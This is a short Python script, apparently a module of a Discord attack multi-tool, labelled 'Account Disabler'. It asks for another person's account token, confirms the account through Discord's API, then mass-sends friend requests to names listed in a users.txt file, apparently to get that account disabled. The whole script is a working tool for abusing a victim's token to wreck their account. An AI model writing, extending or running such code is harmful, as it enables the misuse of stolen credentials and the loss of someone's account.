import requests
import os
from colorama import Fore
from util.plugins.commun import * 

setTitle("Account Disabler")
clear()
accountdisablertitle()

def disable():
    print(f"""{y}[{w}+{y}]{w} Enter account token to disable""")
    usertoken = str(input(f"""{y}[{b}#{y}]{w} Token: """))
    headers = {'Authorization': usertoken, 'Content-Type': 'application/json'}
    res = requests.get('https://discord.com/api/v8/users/@me', headers=headers).json()
    print(f"\n{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} User Details: {res['username']}#{res['discriminator']} - ({res['id']})")
    input(f"{y}[{b}#{y}]{w} If These Details Are Correct Press Enter! (This Will Start Disbaling The Account)")
    print()
    for username in open('util/11_AccountDisabler/users.txt', 'r').read().splitlines():
        try:
            usr = username.split('#')
            r = requests.post('https://discord.com/api/v8/users/@me/relationships', headers=headers, json={'username': usr[0], 'discriminator': usr[1]})
            print(f"\t{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} {usr[0]}#{usr[1]} Added!")
        except:
            print(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} Something Went Wrong!")
    print(f"\n\n{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Account successfully disable")
    input(f"""\n{y}[{b}#{y}]{w} Press ENTER to exit""")
    main()

disable()